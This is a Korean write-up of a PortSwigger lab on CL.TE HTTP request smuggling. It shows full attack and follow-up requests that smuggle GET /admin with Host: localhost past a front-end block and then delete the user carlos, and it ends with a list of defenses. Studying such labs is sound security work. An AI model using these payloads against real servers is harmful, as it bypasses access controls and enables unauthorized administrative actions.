# Lab: Bypassing front-end security controls, CL.TE vulnerability

## 개요

- **난이도**: Practitioner
- **주제**: HTTP Request Smuggling — CL.TE / 프론트엔드 접근 제어 우회
- **링크**: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

## 목표

프론트엔드가 `/admin` 경로에 대한 접근을 차단하는 구조에서, CL.TE 스머글링으로 프론트엔드 검사를 우회해 백엔드의 관리자 패널에 접근하고 carlos 를 삭제한다.

## 001 랩(Differential Response 확인)과의 차이

```
[001 랩 — CL.TE 취약점 탐지]
  목적: 취약점 존재 확인
  방법: /404notfound 경로를 심어 다른 응답(404) 유발
  결과: Probe 가 404 를 받으면 취약점 확인

[003 랩 (이번) — CL.TE 접근 제어 우회]
  목적: 프론트엔드가 차단한 /admin 접근
  방법: /admin 요청을 body 에 심어 프론트엔드 검사 우회
  결과: Follow-up 이 /admin 응답을 받음
```

## CL.TE 접근 제어 우회 원리

```
[일반적인 /admin 직접 요청]
  클라이언트 → GET /admin → 프론트엔드 → 차단 (403)

[CL.TE 스머글링으로 우회]
  클라이언트 → POST / (body에 GET /admin 포함) → 프론트엔드 → 통과 (POST / 는 허용)
                                                  ↓
                                               백엔드(TE)
                                               0\r\n\r\n 에서 종료
                                               GET /admin 버퍼 잔류
                                                  ↓
  클라이언트 → GET / (follow-up) → 프론트엔드 → 통과 (GET / 는 허용)
                                                  ↓
                                               같은 백엔드 연결
                                               버퍼의 GET /admin + follow-up 바이트로 요청 완성
                                               → /admin 처리 → 응답 반환
                                                  ↓
  클라이언트 ← /admin 응답 ←────────────────────────────────────
```

## 공격 패킷

### Attack 요청 (스머글링 심기)

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 20

```

```
body 분석:
  0\r\n\r\n                  ← 백엔드(TE): 청크 종료, 이후 버퍼 잔류
  GET /admin HTTP/1.1\r\n    ← 버퍼 시작
  Host: localhost\r\n        ← 내부 접근용 Host
  Content-Length: 20\r\n     ← body 20바이트를 기다림 → 연결 유지
  \r\n

Content-Length: 20 의 역할:
  - 없으면 (완전한 요청): 백엔드가 즉시 GET /admin 처리
                          → admin 응답이 follow-up 도착 전에 사라짐
                          → follow-up 이 정상 200 을 받음 (공격 실패)
  - 있으면 (불완전 요청): 백엔드가 20바이트 body 를 기다림
                          → follow-up 도착 시 앞 20바이트를 body 로 소비
                          → GET /admin 처리 완료 → admin 응답 반환
                          → front-end 가 이 응답을 follow-up 응답으로 매핑 ✓
```

### Follow-up 요청

```http
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Connection: close

```

```
백엔드에서의 처리:
  버퍼(GET /admin, CL=20) + follow-up 앞 20바이트 → body 완성
  → GET /admin 처리 → admin 패널 응답 반환
  → follow-up 클라이언트가 admin 응답 수신
```

## 공격 단계

### 1단계 — /admin 접근 확인

Attack 전송 후 Follow-up 전송:

```
응답 예시:
  HTTP/1.1 200 OK
  ...
  <a href="/admin/delete?username=carlos">Delete</a>
  ...
```

### 2단계 — carlos 삭제

smuggle_path 를 `/admin/delete?username=carlos` 로 변경:

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Length: [cl]
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 20

```

## 실전 어려움 — 두 번째 응답 미확인 문제

```
[이상적인 흐름]
  Attack → Follow-up → admin 응답 수신 → 삭제 URL 확인 → 삭제 요청

[실제 어려움]
  follow-up 응답이 항상 admin 응답으로 오지 않음:
  - 프론트엔드가 attack/follow-up 을 다른 백엔드 연결로 라우팅
  - 타이밍 불일치 (admin 응답이 매핑 전에 사라짐)
  - 커넥션 풀 불확실성

[실용적 접근]
  1. 001 랩처럼 CL.TE 취약점 존재 자체를 Differential Response 로 먼저 확인
  2. 취약점 확인 후 랩 설명에서 제공된 delete URL 구조를 직접 사용
  3. /admin/delete?username=carlos 를 smuggle_path 로 설정해 반복 시도
     → 한 번이라도 smuggled 요청이 처리되면 삭제 완료
```

## 001 랩(탐지)과 003 랩(우회)의 비교

| 항목 | 001 — CL.TE 탐지 | 003 — CL.TE 우회 |
|------|-----------------|-----------------|
| 목적 | 취약점 존재 확인 | 접근 제어 우회 |
| Smuggle 경로 | /404notfound | /admin |
| Smuggle Host | 불필요 | localhost |
| Follow-up | GET / (probe) | GET / (follow-up) |
| 성공 지표 | probe 가 404 수신 | follow-up 이 admin 응답 수신 |
| Content-Length in smuggled | 없음 | 20 (타이밍 문제 해결) |
| 실전 안정성 | 상대적으로 안정 | 타이밍 민감, 반복 필요 |

## 방어

```
[근본 원인]
  프론트엔드가 경로 기반 접근 제어를 적용하지만
  백엔드로의 바이트 스트림이 조작 가능

[방어 방법]
  1. HTTP/2 엔드투엔드 사용
     바이너리 프레이밍으로 CL/TE 모호성 제거

  2. 프론트엔드/백엔드 동일 요청 파싱 기준 적용
     CL + TE 동시 존재 시 요청 거부

  3. 접근 제어를 백엔드에서도 적용
     프론트엔드 우회 시에도 백엔드에서 차단
     (Defense in Depth)

  4. 백엔드 연결 재사용 비활성화
     요청마다 새 TCP 연결 → 버퍼 잔류 불가 (성능 저하)
```

## 핵심 정리

- CL.TE 스머글링으로 프론트엔드의 경로 기반 접근 제어를 우회할 수 있다.
- 프론트엔드는 `POST /` 만 보고 통과시키며, 백엔드는 body 에 심긴 `GET /admin` 을 처리한다.
- smuggled 요청에 `Content-Length: 20` 을 넣어야 백엔드가 follow-up 을 기다린다. 없으면 admin 응답이 follow-up 매핑 전에 사라진다.
- 실전에서는 두 번째 응답(admin) 확인이 불안정하므로, 취약점을 확인한 뒤 삭제 URL 을 직접 smuggle_path 에 넣고 반복 시도하는 것이 현실적이다.

## 배운 점 및 추가 학습

### 1. 프론트엔드 접근 제어의 한계

```
[흔한 오해]
  프론트엔드에서 /admin 차단 → 백엔드는 안전

[실제]
  HTTP Request Smuggling 으로 프론트엔드 검사 자체를 우회 가능
  → 접근 제어는 반드시 백엔드에서도 중복 적용해야 함 (Defense in Depth)
```

### 2. CL.TE 스머글링 활용 범위

```
[탐지 단계]  → 001 랩: Differential Response (404 유발)
[우회 단계]  → 003 랩: 접근 제어 우회 (/admin 접근)
[심화 단계]  → 요청 캡처, 세션 하이재킹, 반사형 XSS 등
```

### 3. 같은 TCP 연결로 보내야 하는 이유

```
attack ── 연결 A ──→ 백엔드 B1 (버퍼에 GET /admin 잔류)
follow-up ── 연결 B ──→ 백엔드 B2 (버퍼 없음 → 정상 200)

→ attack 과 follow-up 은 반드시 같은 TCP 연결로 전송
  (같은 연결 → front-end 가 같은 백엔드 연결로 라우팅)
```
